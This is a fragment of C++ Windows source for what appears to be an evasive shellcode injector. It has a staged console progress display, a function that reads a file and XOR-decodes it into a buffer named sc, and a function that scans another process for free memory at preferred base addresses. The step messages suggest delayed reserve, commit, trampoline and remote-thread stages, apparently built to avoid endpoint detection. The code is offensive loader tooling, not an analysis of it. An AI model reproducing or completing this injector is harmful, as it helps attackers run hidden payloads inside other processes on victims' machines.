void EnableAnsiSupport()
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
}

void DelayShowProgress(double percentage, int step, int msStepDelay, int tpid, int time_needed, int vmbase)
{
    int val = (int)(percentage * 100);
    int lpad = (int)(percentage * PBAR_WDH);
    int rpad = PBAR_WDH - lpad;

    system("cls");

    printf(task_info_bar, tpid, step, (double)time_needed / 60000.0);
    printf(coffee_time);

    switch (step) {
    case 0:
        printf(found_suitable_base, vmbase);
        printf("\n");
        break;
    case 1:
        printf(found_suitable_base, vmbase);
        printf("\n");
        printf(reserving_na);
        break;
    case 2:
        printf(found_suitable_base, vmbase);
        printf(reserved_na);
        printf("\n");
        printf(commiting);
        break;
    case 3:
        printf(found_suitable_base, vmbase);
        printf(reserved_na);
        printf(commited);
        printf("\n");
        printf(do_tramp);
        break;
    case 4:
        printf(found_suitable_base, vmbase);
        printf(reserved_na);
        printf(commited);
        printf(done_tramp);
        printf("\n");
        printf(do_thread);
        break;
    case 5:
        printf(found_suitable_base, vmbase);
        printf(reserved_na);
        printf(commited);
        printf(done_tramp);
        printf(done_thread);
        printf(done);
        break;
    }

    if (step != 5) {
        printf(bar_format, val, lpad, PBAR, rpad, "");
        fflush(stdout);
        Sleep(msStepDelay);
    }
}

unsigned char* ReadProcessBlob(const char* fnamSc, DWORD* szSc) 
{
    DWORD szRead{ 0 };

    HANDLE hFile = CreateFileA(
        fnamSc,
        GENERIC_READ,
        NULL,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (INVALID_HANDLE_VALUE == hFile)
        return nullptr;

    SIZE_T szFile = GetFileSize(hFile, NULL);
    *szSc = szFile;

    unsigned char* raw = new unsigned char[szFile];
    unsigned char* sc = new unsigned char[szFile];

    if (!ReadFile(hFile, raw, szFile, &szRead, NULL))
        return nullptr;

    int i;

    for (i = 0; i < szRead; i++) {
        sc[i] = raw[i] ^ XOR_KEY;
    }

    return sc;
}

LPVOID GetSuitableBaseAddress(HANDLE hProc, DWORD szPage, DWORD szAllocGran, DWORD cVmResv)
{
    MEMORY_BASIC_INFORMATION mbi;

    for (auto base : VC_PREF_BASES) {
        VirtualQueryEx(
            hProc,
            base,
            &mbi,
            sizeof(MEMORY_BASIC_INFORMATION)
        );

        if (MEM_FREE == mbi.State) {
            uint64_t i;
            for (i = 0; i < cVmResv; ++i) {
                LPVOID currentBase = (void*)((DWORD_PTR)base + (i * szAllocGran));
                VirtualQueryEx(
                    hProc,
                    currentBase,
                    &mbi,
                    sizeof(MEMORY_BASIC_INFORMATION)
                );
                if (MEM_FREE != mbi.State)
                    break;
            }
            if (i == cVmResv) {
                // found suitable base
                return base;
            }
        }
    }
    return nullptr;
}

